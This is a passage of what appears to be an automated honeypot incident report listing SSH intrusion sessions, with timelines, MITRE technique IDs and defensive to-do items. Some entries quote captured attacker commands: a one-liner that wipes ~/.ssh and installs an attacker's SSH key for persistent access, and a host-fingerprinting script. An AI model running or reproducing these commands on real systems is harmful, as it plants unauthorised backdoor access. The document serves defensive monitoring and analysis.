### 🔴 HIGH · IR-522dd05c9eee

| Field | Detail |
|---|---|
| **Source IP** | `65.20.138[.]46` |
| **First Seen** | 2026-07-25 09:22 |
| **Last Seen** | 2026-07-25 09:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:22:03` | `cowrie.session.connect` |
| `2026-07-25 09:22:04` | `cowrie.client.version` |
| `2026-07-25 09:22:04` | `cowrie.client.kex` |
| `2026-07-25 09:22:05` | `cowrie.login.success` |
| `2026-07-25 09:22:06` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:22:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.138[.]46` to AbuseIPDB if not already reported
- [ ] Block `65.20.138[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-170ef1024155

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:23 |
| **Last Seen** | 2026-07-25 09:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:23:26` | `cowrie.session.connect` |
| `2026-07-25 09:23:26` | `cowrie.client.version` |
| `2026-07-25 09:23:26` | `cowrie.client.kex` |
| `2026-07-25 09:23:28` | `cowrie.login.success` |
| `2026-07-25 09:23:29` | `cowrie.session.params` |
| `2026-07-25 09:23:29` | `cowrie.command.input` |
| `2026-07-25 09:23:29` | `cowrie.command.input` |
| `2026-07-25 09:23:29` | `cowrie.command.input` |
| `2026-07-25 09:23:29` | `cowrie.command.input` |
| `2026-07-25 09:23:29` | `cowrie.command.input` |
| `2026-07-25 09:23:29` | `cowrie.command.success` |
| `2026-07-25 09:23:29` | `cowrie.command.input` |
| `2026-07-25 09:23:29` | `cowrie.command.input` |
| `2026-07-25 09:23:29` | `cowrie.command.input` |
| `2026-07-25 09:23:29` | `cowrie.command.input` |
| `2026-07-25 09:23:30` | `cowrie.log.closed` |
| `2026-07-25 09:23:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dbbb06eaa7f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:25 |
| **Last Seen** | 2026-07-25 09:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:25:18` | `cowrie.session.connect` |
| `2026-07-25 09:25:18` | `cowrie.client.version` |
| `2026-07-25 09:25:18` | `cowrie.client.kex` |
| `2026-07-25 09:25:20` | `cowrie.login.success` |
| `2026-07-25 09:25:21` | `cowrie.session.params` |
| `2026-07-25 09:25:21` | `cowrie.command.input` |
| `2026-07-25 09:25:21` | `cowrie.command.input` |
| `2026-07-25 09:25:21` | `cowrie.command.input` |
| `2026-07-25 09:25:21` | `cowrie.command.input` |
| `2026-07-25 09:25:21` | `cowrie.command.input` |
| `2026-07-25 09:25:21` | `cowrie.command.success` |
| `2026-07-25 09:25:21` | `cowrie.command.input` |
| `2026-07-25 09:25:21` | `cowrie.command.input` |
| `2026-07-25 09:25:21` | `cowrie.command.input` |
| `2026-07-25 09:25:21` | `cowrie.command.input` |
| `2026-07-25 09:25:22` | `cowrie.log.closed` |
| `2026-07-25 09:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ef1ab0d558e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-25 09:25 |
| **Last Seen** | 2026-07-25 09:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:25:22` | `cowrie.session.connect` |
| `2026-07-25 09:25:22` | `cowrie.client.version` |
| `2026-07-25 09:25:22` | `cowrie.client.kex` |
| `2026-07-25 09:25:22` | `cowrie.login.success` |
| `2026-07-25 09:25:22` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:25:22` | `cowrie.direct-tcpip.data` |
| `2026-07-25 09:25:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f701e8b8b41

| Field | Detail |
|---|---|
| **Source IP** | `45.195.221[.]26` |
| **First Seen** | 2026-07-25 09:26 |
| **Last Seen** | 2026-07-25 09:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:26:24` | `cowrie.session.connect` |
| `2026-07-25 09:26:24` | `cowrie.client.version` |
| `2026-07-25 09:26:24` | `cowrie.client.kex` |
| `2026-07-25 09:26:25` | `cowrie.login.success` |
| `2026-07-25 09:26:26` | `cowrie.session.params` |
| `2026-07-25 09:26:26` | `cowrie.command.input` |
| `2026-07-25 09:26:26` | `cowrie.command.failed` |
| `2026-07-25 09:26:26` | `cowrie.log.closed` |
| `2026-07-25 09:26:27` | `cowrie.session.params` |
| `2026-07-25 09:26:27` | `cowrie.command.input` |
| `2026-07-25 09:26:27` | `cowrie.session.file_download` |
| `2026-07-25 09:26:27` | `cowrie.log.closed` |
| `2026-07-25 09:26:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.195.221[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.195.221[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db27fa063c0c

| Field | Detail |
|---|---|
| **Source IP** | `45.195.221[.]26` |
| **First Seen** | 2026-07-25 09:26 |
| **Last Seen** | 2026-07-25 09:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:26:27` | `cowrie.session.connect` |
| `2026-07-25 09:26:27` | `cowrie.client.version` |
| `2026-07-25 09:26:27` | `cowrie.client.kex` |
| `2026-07-25 09:26:28` | `cowrie.login.success` |
| `2026-07-25 09:26:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.195.221[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.195.221[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-185bd1bf2c2b

| Field | Detail |
|---|---|
| **Source IP** | `45.195.221[.]26` |
| **First Seen** | 2026-07-25 09:26 |
| **Last Seen** | 2026-07-25 09:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:26:28` | `cowrie.session.connect` |
| `2026-07-25 09:26:28` | `cowrie.client.version` |
| `2026-07-25 09:26:28` | `cowrie.client.kex` |
| `2026-07-25 09:26:29` | `cowrie.login.success` |
| `2026-07-25 09:26:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.195.221[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.195.221[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a198c901ed7d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:27 |
| **Last Seen** | 2026-07-25 09:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:27:10` | `cowrie.session.connect` |
| `2026-07-25 09:27:10` | `cowrie.client.version` |
| `2026-07-25 09:27:10` | `cowrie.client.kex` |
| `2026-07-25 09:27:12` | `cowrie.login.success` |
| `2026-07-25 09:27:13` | `cowrie.session.params` |
| `2026-07-25 09:27:13` | `cowrie.command.input` |
| `2026-07-25 09:27:13` | `cowrie.command.input` |
| `2026-07-25 09:27:13` | `cowrie.command.input` |
| `2026-07-25 09:27:13` | `cowrie.command.input` |
| `2026-07-25 09:27:13` | `cowrie.command.input` |
| `2026-07-25 09:27:13` | `cowrie.command.success` |
| `2026-07-25 09:27:13` | `cowrie.command.input` |
| `2026-07-25 09:27:13` | `cowrie.command.input` |
| `2026-07-25 09:27:13` | `cowrie.command.input` |
| `2026-07-25 09:27:13` | `cowrie.command.input` |
| `2026-07-25 09:27:14` | `cowrie.log.closed` |
| `2026-07-25 09:27:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b16ebef206d9

| Field | Detail |
|---|---|
| **Source IP** | `65.20.250[.]180` |
| **First Seen** | 2026-07-25 09:27 |
| **Last Seen** | 2026-07-25 09:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:27:38` | `cowrie.session.connect` |
| `2026-07-25 09:27:38` | `cowrie.client.version` |
| `2026-07-25 09:27:38` | `cowrie.client.kex` |
| `2026-07-25 09:27:39` | `cowrie.login.success` |
| `2026-07-25 09:27:40` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:27:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.250[.]180` to AbuseIPDB if not already reported
- [ ] Block `65.20.250[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa8d71606dc7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:29 |
| **Last Seen** | 2026-07-25 09:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:29:05` | `cowrie.session.connect` |
| `2026-07-25 09:29:05` | `cowrie.client.version` |
| `2026-07-25 09:29:05` | `cowrie.client.kex` |
| `2026-07-25 09:29:06` | `cowrie.login.success` |
| `2026-07-25 09:29:07` | `cowrie.session.params` |
| `2026-07-25 09:29:07` | `cowrie.command.input` |
| `2026-07-25 09:29:07` | `cowrie.command.input` |
| `2026-07-25 09:29:07` | `cowrie.command.input` |
| `2026-07-25 09:29:07` | `cowrie.command.input` |
| `2026-07-25 09:29:07` | `cowrie.command.input` |
| `2026-07-25 09:29:07` | `cowrie.command.success` |
| `2026-07-25 09:29:07` | `cowrie.command.input` |
| `2026-07-25 09:29:07` | `cowrie.command.input` |
| `2026-07-25 09:29:07` | `cowrie.command.input` |
| `2026-07-25 09:29:07` | `cowrie.command.input` |
| `2026-07-25 09:29:08` | `cowrie.log.closed` |
| `2026-07-25 09:29:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8606870ebb4

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 09:29 |
| **Last Seen** | 2026-07-25 09:29 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:29:11` | `cowrie.session.connect` |
| `2026-07-25 09:29:11` | `cowrie.client.version` |
| `2026-07-25 09:29:12` | `cowrie.client.kex` |
| `2026-07-25 09:29:18` | `cowrie.login.success` |
| `2026-07-25 09:29:19` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:29:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-25 09:29:21` | `cowrie.direct-tcpip.data` |
| `2026-07-25 09:29:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b74bc8517c6

| Field | Detail |
|---|---|
| **Source IP** | `187.210.77[.]105` |
| **First Seen** | 2026-07-25 09:29 |
| **Last Seen** | 2026-07-25 09:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:29:12` | `cowrie.session.connect` |
| `2026-07-25 09:29:12` | `cowrie.client.version` |
| `2026-07-25 09:29:12` | `cowrie.client.kex` |
| `2026-07-25 09:29:13` | `cowrie.login.success` |
| `2026-07-25 09:29:13` | `cowrie.session.params` |
| `2026-07-25 09:29:13` | `cowrie.command.input` |
| `2026-07-25 09:29:13` | `cowrie.command.failed` |
| `2026-07-25 09:29:14` | `cowrie.log.closed` |
| `2026-07-25 09:29:14` | `cowrie.session.params` |
| `2026-07-25 09:29:14` | `cowrie.command.input` |
| `2026-07-25 09:29:14` | `cowrie.session.file_download` |
| `2026-07-25 09:29:14` | `cowrie.log.closed` |
| `2026-07-25 09:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.210.77[.]105` to AbuseIPDB if not already reported
- [ ] Block `187.210.77[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-176da2a29dd6

| Field | Detail |
|---|---|
| **Source IP** | `187.210.77[.]105` |
| **First Seen** | 2026-07-25 09:29 |
| **Last Seen** | 2026-07-25 09:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:29:15` | `cowrie.session.connect` |
| `2026-07-25 09:29:15` | `cowrie.client.version` |
| `2026-07-25 09:29:15` | `cowrie.client.kex` |
| `2026-07-25 09:29:15` | `cowrie.login.success` |
| `2026-07-25 09:29:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.210.77[.]105` to AbuseIPDB if not already reported
- [ ] Block `187.210.77[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f8ee3bce99a

| Field | Detail |
|---|---|
| **Source IP** | `187.210.77[.]105` |
| **First Seen** | 2026-07-25 09:29 |
| **Last Seen** | 2026-07-25 09:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:29:15` | `cowrie.session.connect` |
| `2026-07-25 09:29:15` | `cowrie.client.version` |
| `2026-07-25 09:29:15` | `cowrie.client.kex` |
| `2026-07-25 09:29:16` | `cowrie.login.success` |
| `2026-07-25 09:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.210.77[.]105` to AbuseIPDB if not already reported
- [ ] Block `187.210.77[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26edae19b128

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:31 |
| **Last Seen** | 2026-07-25 09:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:31:06` | `cowrie.session.connect` |
| `2026-07-25 09:31:06` | `cowrie.client.version` |
| `2026-07-25 09:31:06` | `cowrie.client.kex` |
| `2026-07-25 09:31:08` | `cowrie.login.success` |
| `2026-07-25 09:31:09` | `cowrie.session.params` |
| `2026-07-25 09:31:09` | `cowrie.command.input` |
| `2026-07-25 09:31:09` | `cowrie.command.input` |
| `2026-07-25 09:31:09` | `cowrie.command.input` |
| `2026-07-25 09:31:09` | `cowrie.command.input` |
| `2026-07-25 09:31:09` | `cowrie.command.input` |
| `2026-07-25 09:31:09` | `cowrie.command.success` |
| `2026-07-25 09:31:09` | `cowrie.command.input` |
| `2026-07-25 09:31:09` | `cowrie.command.input` |
| `2026-07-25 09:31:09` | `cowrie.command.input` |
| `2026-07-25 09:31:09` | `cowrie.command.input` |
| `2026-07-25 09:31:09` | `cowrie.log.closed` |
| `2026-07-25 09:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc692648d672

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]251` |
| **First Seen** | 2026-07-25 09:32 |
| **Last Seen** | 2026-07-25 09:32 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:32:16` | `cowrie.session.connect` |
| `2026-07-25 09:32:16` | `cowrie.client.version` |
| `2026-07-25 09:32:29` | `cowrie.client.kex` |
| `2026-07-25 09:32:30` | `cowrie.login.success` |
| `2026-07-25 09:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a56b79b69bde

| Field | Detail |
|---|---|
| **Source IP** | `109.233.21[.]109` |
| **First Seen** | 2026-07-25 09:32 |
| **Last Seen** | 2026-07-25 09:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:32:27` | `cowrie.session.connect` |
| `2026-07-25 09:32:28` | `cowrie.client.version` |
| `2026-07-25 09:32:28` | `cowrie.client.kex` |
| `2026-07-25 09:32:29` | `cowrie.login.success` |
| `2026-07-25 09:32:29` | `cowrie.direct-tcpip.request` |
| `2026-07-25 09:32:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.233.21[.]109` to AbuseIPDB if not already reported
- [ ] Block `109.233.21[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-553b9e20a000

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-25 09:33 |
| **Last Seen** | 2026-07-25 09:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-25 09:33:03` | `cowrie.session.connect` |
| `2026-07-25 09:33:03` | `cowrie.client.version` |
| `2026-07-25 09:33:03` | `cowrie.client.kex` |
| `2026-07-25 09:33:05` | `cowrie.login.success` |
| `2026-07-25 09:33:06` | `cowrie.session.params` |
| `2026-07-25 09:33:06` | `cowrie.command.input` |
| `2026-07-25 09:33:06` | `cowrie.command.input` |
| `2026-07-25 09:33:06` | `cowrie.command.input` |
| `2026-07-25 09:33:06` | `cowrie.command.input` |
